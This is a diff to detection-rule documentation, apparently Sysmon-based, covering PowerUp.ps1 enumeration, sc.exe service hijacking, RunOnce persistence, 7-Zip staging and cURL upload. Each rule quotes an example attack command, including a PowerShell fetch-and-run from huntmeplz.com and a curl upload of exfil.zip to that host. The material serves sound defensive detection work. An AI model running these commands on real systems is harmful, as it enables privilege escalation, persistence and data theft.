@@ -225,19 +225,21 @@ From the given **"Rule Creation Standard"**, this rule should use the required d
   - Matches when the process image ends with `\powershell.exe`.  
   - Checks the `CommandLine` for arguments that indicate execution of PowerUp.ps1:  
     - `iex(new-object net.webclient).` → instructs PowerShell to create a WebClient object and execute inline code.  
-    - `Invoke-AllChecks;` → runs PowerUp’s built-in function to enumerate privilege escalation vectors.  
+    - `Invoke-AllChecks;` → runs PowerUp’s built-in function to enumerate privilege escalation vectors.
+
 **Malicious Behavior** ❌
 The command:  
 `powershell "iex(new-object net.webclient).downloadstring('http://huntmeplz.com/PowerUp.ps1'); Invoke-AllChecks;"`
-
 - Downloads and executes **PowerUp.ps1** directly from a remote, untrusted domain (`huntmeplz.com`).  
 - `Invoke-AllChecks` runs a full privilege escalation audit, allowing attackers to identify misconfigurations, vulnerable services, or exploitable permissions.  
-- This is a common **post-exploitation technique** used to escalate privileges after initial access.  
+- This is a common **post-exploitation technique** used to escalate privileges after initial access.
+
 **Benign Behavior** ✅
 PowerUp.ps1 is part of the **PowerSploit framework**, which can be used legitimately by penetration testers or administrators in controlled environments.  
 - In benign cases, it may be executed from a **local, trusted path** (e.g., `C:\Tools\PowerUp.ps1`) rather than downloaded from the internet.  
 - Administrators may use `Invoke-AllChecks` during **security assessments** to identify privilege escalation risks in their own environment.  
-- The difference lies in **context**: trusted source, authorized usage, and controlled environment vs. attacker-controlled domain and unauthorized execution.  
+- The difference lies in **context**: trusted source, authorized usage, and controlled environment vs. attacker-controlled domain and unauthorized execution.
+
 **Key Point**
 This rule is designed to detect **privilege escalation enumeration** through PowerUp.ps1 by monitoring suspicious PowerShell command-line patterns.  
 - Malicious usage is characterized by **remote download and execution** from untrusted domains.  
@@ -274,11 +276,13 @@ From the given **"Rule Creation Standard"**, this rule uses the required detecti
   - Checks the `CommandLine` for arguments that indicate service reconfiguration:  
     - `binPath=` → specifies the binary path for the service.  
     - `config` → modifies the service configuration.  
-    - `-e` → executes with elevated privileges.  
+    - `-e` → executes with elevated privileges.
+   
 **Malicious Behavior** ❌
 Attackers abuse **`sc.exe config`** with `binPath=` to replace a legitimate service binary with a malicious executable.  
 - This allows the attacker to run their payload with **SYSTEM privileges**, effectively escalating rights.  
-- The `Temp` or non-standard paths for service binaries are strong indicators of compromise.  
+- The `Temp` or non-standard paths for service binaries are strong indicators of compromise.
+
 **Benign Behavior** ✅
 Administrators may legitimately use `sc.exe config` to:  
 - Update service paths during software upgrades.  
@@ -287,7 +291,8 @@ Administrators may legitimately use `sc.exe config` to:
 
 The difference lies in **context**:  
 - Benign usage points to trusted binaries in standard directories (e.g., `C:\Program Files\...`).  
-- Malicious usage involves suspicious paths, executables dropped in `Temp`, or unexpected privilege escalation attempts.  
+- Malicious usage involves suspicious paths, executables dropped in `Temp`, or unexpected privilege escalation attempts.
+
 **Key Point**
 This rule is designed to detect **service binary modification** attempts that could lead to privilege escalation. Analysts should validate whether the **binary path** points to a trusted application or a suspicious payload before confirming malicious activity.
 
@@ -323,14 +328,15 @@ From the given **"Rule Creation Standard"**, this rule uses the required detecti
   - Checks the `CommandLine` for arguments that indicate registry key modification:  
     - `add` → adds a new registry entry.  
     - `/v` → specifies the value name.  
-    - `/t REG_SZ` → sets the type to string.  
+    - `/t REG_SZ` → sets the type to string.
+
 **Malicious Behavior**
 Command observed:  
 `reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v MicrosoftUpdate /t REG_SZ /d "C:\Windows\System32\cmdd.exe"` ❌  
-
 - This adds a **RunOnce registry key** that executes `cmdd.exe` on the next system startup.  
 - Attackers abuse RunOnce keys to maintain persistence, ensuring their payload runs automatically after reboot.  
-- The use of a suspicious binary (`cmdd.exe`) in `System32` is a strong indicator of compromise. 
+- The use of a suspicious binary (`cmdd.exe`) in `System32` is a strong indicator of compromise.
+
 **Benign Behavior** ✅
 Administrators or legitimate software installers may use **RunOnce keys** to:  
 - Execute setup tasks after reboot.  
@@ -339,7 +345,8 @@ Administrators or legitimate software installers may use **RunOnce keys** to:
 
 The difference lies in **context**:  
 - Benign usage points to trusted executables (e.g., `setup.exe` from Microsoft or vendor software).  
-- Malicious usage involves unknown or suspicious binaries masquerading as legitimate updates. 
+- Malicious usage involves unknown or suspicious binaries masquerading as legitimate updates.
+
 **Key Point**
 This rule is designed to detect **registry-based persistence** via RunOnce keys. Analysts should validate whether the **binary path** belongs to a trusted application or an attacker-controlled payload before confirming malicious activity.
 
@@ -375,13 +382,15 @@ From the given **"Rule Creation Standard"**, this rule uses the required detecti
   - Matches when the process image ends with `\7z.exe`.  
   - Checks the `CommandLine` for arguments that indicate archiving with password protection:  
     - `a` → add files to a new archive.  
-    - `-p` → sets a password for the archive, often used to conceal contents.  
+    - `-p` → sets a password for the archive, often used to conceal contents.
+
 **Malicious Behavior** ❌
 Command observed:  
 `7z a exfil.zip * -p` 
 - This creates a compressed archive (`exfil.zip`) of all files (`*`) and protects it with a password.  
 - Attackers often use this technique to **collect and stage sensitive data** before exfiltration.  
-- Password protection (`-p`) makes it harder for defenders to inspect the archive contents, aiding in data theft.  
+- Password protection (`-p`) makes it harder for defenders to inspect the archive contents, aiding in data theft.
+
 **Benign Behavior** ✅
 7-Zip is a legitimate utility widely used for:  
 - Compressing files to save storage space.  
@@ -390,7 +399,8 @@ Command observed:
 
 The difference lies in **context**:  
 - Benign usage involves archiving trusted files for internal use or secure sharing.  
-- Malicious usage involves archiving large sets of sensitive data (e.g., `*` wildcard) with password protection, often followed by exfiltration attempts.  
+- Malicious usage involves archiving large sets of sensitive data (e.g., `*` wildcard) with password protection, often followed by exfiltration attempts.
+
 **Key Point**
 This rule is designed to detect **data collection and staging** via 7-Zip. Analysts should validate whether the **archive target** and **password usage** are consistent with legitimate administrative activity or indicative of **data exfiltration attempts**.
 
@@ -424,13 +434,15 @@ From the given **"Rule Creation Standard"**, this rule uses the required detecti
   - Detects `EventID: 1` (process creation).  
   - Matches when the process image ends with `\curl.exe`.  
   - Checks the `CommandLine` for arguments that indicate data upload:  
-    - `-d` → sends data in an HTTP POST request.  
+    - `-d` → sends data in an HTTP POST request.
+
 **Malicious Behavior** ❌
 Command observed:  
 `curl -d @exfil.zip http://huntmeplz.com:8080/` 
 - This command uploads the contents of `exfil.zip` to a remote server controlled by the attacker.  
 - The `-d @exfil.zip` syntax tells cURL to read the file and send it as POST data, effectively **exfiltrating sensitive data**.  
-- The use of a suspicious domain (`huntmeplz.com`) and non-standard port (`8080`) further indicates malicious intent.  
+- The use of a suspicious domain (`huntmeplz.com`) and non-standard port (`8080`) further indicates malicious intent.
+
 **Benign Behavior** ✅
 cURL is a legitimate utility widely used for:  
 - Sending API requests with small data payloads (e.g., `curl -d "username=test" http://api.example.com/login`).  
@@ -439,7 +451,8 @@ cURL is a legitimate utility widely used for:
 
 The difference lies in **context**:  
 - Benign usage typically involves small, structured data sent to trusted domains.  
-- Malicious usage involves bulk data (archives, sensitive files) sent to **untrusted external servers**.  
+- Malicious usage involves bulk data (archives, sensitive files) sent to **untrusted external servers**.
+
 **Key Point**
 This rule is designed to detect **data exfiltration attempts** via cURL. Analysts should validate whether the **destination domain** and **data type** are consistent with legitimate operations or indicative of **unauthorized data theft**.
 
